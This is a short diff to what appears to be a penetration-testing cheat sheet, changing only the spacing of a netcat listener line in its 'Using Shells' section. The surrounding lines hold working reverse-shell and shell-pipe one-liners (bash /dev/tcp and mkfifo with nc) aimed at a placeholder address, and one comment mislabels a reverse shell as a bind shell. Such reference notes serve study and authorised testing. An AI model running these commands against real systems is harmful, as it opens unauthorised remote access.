@@ -67,7 +67,7 @@ Public Exploits
 
 Using Shells
 
-	nc -lvnp 1234                       # start a nc listener on a local port
+	nc -lvnp 1234  # start a nc listener on a local port
 	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'      # send a reverse shell from the remote server
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f      # start a bind shell on the remote server
 	nc 10.10.10.1 1234      # connect to a bind shell started on the remote server
